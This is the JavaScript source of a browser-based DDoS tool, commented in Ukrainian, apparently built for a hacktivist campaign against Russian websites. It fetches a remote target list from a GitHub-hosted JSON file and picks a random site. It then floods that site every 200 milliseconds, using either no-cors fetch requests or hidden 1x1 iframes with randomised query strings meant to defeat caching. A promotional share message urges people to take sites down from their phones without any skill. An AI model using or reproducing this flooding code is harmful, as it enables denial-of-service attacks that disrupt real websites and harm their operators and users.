// Звідси будуть завантажуватись цілі
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json'
const shareText = `Сайт для **дудосу** з **телефону!**
Переходь на сайт та вали сайти рф **без програмування** та інших навичок!
> bogdan-dev.ml/simple-ddos
`

const saverInterval = 2500
const attackInterval = 200

// Функції для керування документом

const frameDiv = $("#frames")
const attacks = $("#attacks")

// Функції рандому
const add_count = () => attacks.text(parseInt(attacks.text())+1) // Кількість атак

const randint = (num) => Math.floor(Math.random() * num) // Рандомне ціле число

function getRandomArbitrary() {
	const max = 1_000_000;
	const min = 100_000;
	return Math.random() * (max - min) + min;
}

async function getSalt(target) {
	// Сіль з нашого Криму

	const now = (new Date()).getTime();
	return target + '?' + now + getRandomArbitrary();
}

function msgLoad() {
	$("#load").remove();
	$("<p>", {id:"load"}).text("Завантажуємо цілі...")
	.appendTo(box);
}


// Завантаження цілей
async function getTarget() {
	// Створення сповіщення про завантаження цілей
	msgLoad();

    let targets = await fetch(targetSource)
    .catch((e) => {
    	$("#load").text("Помилка завантаження!");
    	alert(`Помилка!\nПеревірте підключення до інтернету!\nТекст помилки: ${e}`);
    });
    if (targets instanceof Response) { // Якщо запит повернув результат
    	const data = await targets.json();

		targets = [];

		// Фільтрування цілей
		for (let i = 0; i < data.length; i++) {
		    if (['post', 'get'].includes(data[i].method)) {
		        targets.push(data[i])
		    }
		};
		$("#load").remove();
	   	
	    return targets[randint(targets.length)]; // Рандомна ціль
    };
}


const Frames = {
	async draw(target, id) {
		$("<iframe>", {
			src: target,
			id: "frame" + id,
			frameborder: 0,
			width: 1,
			height: 1
		}).appendTo(frameDiv)
	},
	clear() {frameDiv.empty()}
}


// Відображення цілі та методу атаки
const targetField = $("#target")
const methodField = $("#method")

// https://github.com/BogdanDevUA/simple-ddos/

setTarget = (target) => {
	if (target) {
		targetField.text(target.page);
	    methodField.text(target.method.toUpperCase());
	    return
	}
	return true
}


class Doser {
    attack = false; // Статус атаки
    interval; // Цикл DDoS-атаки
    //saver; // Цикл збереження данних про кількість атак

    async start(isFetch=false) {
    	this.attack = true;

        // Запуск атаки

        btn.text("Стоп");
        const target = await getTarget();

        if (setTarget(target)) {
        	// Якщо не завнтажились цілі

        	this.attack = false;
        	btn.text("Старт!");
        	return; // Стоп
        };
        console.log(target);

        this.interval = setInterval(isFetch ? async function () {
            // Запити

            await fetch([target.page], {
	            method: target.method,
	            mode: 'no-cors',
				referrerPolicy: 'no-referrer'
	        }).catch((e) => {})
	        .then(() => {
	            // Після запиту

	            console.log("Ok!");
	            add_count();
	        })
        } : async function () {

        	const targett = await getSalt(target.page); // Беремо сіль з нашого Криму

        	// Надсилання запиту на сайт за допомогою елементу iframe
        	await Frames.draw(targett, randint(0, 100_000));
        	console.log(targett);

        	add_count();

        	if ($("#frames")[0].childElementCount >= 200) {Frames.clear()};
        }, attackInterval);

        /*
        this.saver = setInterval(() => {
        	let atck = Database.attacks;

        	atck = !atck ? 0 : parseInt(atck); // Попередні атаки
        	Database.attacks =
        	atck + (parseInt(attacks.text()) - atck); // Збереження

        	console.log("Saved!");
        }, saverInterval);
        */
    };
    stop() {
    	if (this.interval) {
	    	this.attack = false;
	    	clearInterval(this.interval);
	    	//clearInterval(this.saver);
	    	Frames.clear();
	    	btn.text("Старт!");
    	}
    };
}



const btn = $("#button #button-text")
const Database = window.localStorage
const box = $("#box")

let neon = false
Doser = new Doser // Ініціалізація воркера

$(() => {
	if (!Database.check_license) {
		// Ліцензія обов'язкова для прочитання

		alert('Прочитайте ліцензію в розділі "Ресурси"!')
		Database.check_license = true
	}

	$("#button").click((e) => {
		e.preventDefault();

		!Doser.attack ? Doser.start() : Doser.stop();
	});

	/*
	$("#attackCount").click(() => {
		// Загальна кількість атак

		const a = Database.attacks
		alert(`Взагалом атаковано: ${!a?0:a}`)
	});
	*/

	// Пасхалки)

	$("#fixed-bugs").click(() => {alert("Я справді пофіксив баги!")})

	$("#uses").click(() => {alert("Цей сайт був написаний 13 річним хакером на JS, HTML, CSS")})

	$("#ua").dblclick(() => {alert("Героям Слава!")})

	const container = $("#container")
	container.dblclick((e) => {
		if (!neon) {
			neon = true
			container.css("box-shadow", "5px 5px 5px #00ffff")
			return
		}
		neon = false
		container.css("box-shadow", "5px 5px 5px #444")
	})

	/*
	$("#share").click(() => {window.open("tg://?text=${shareText}", "_blank")})
	*/
})

// Слава Україні!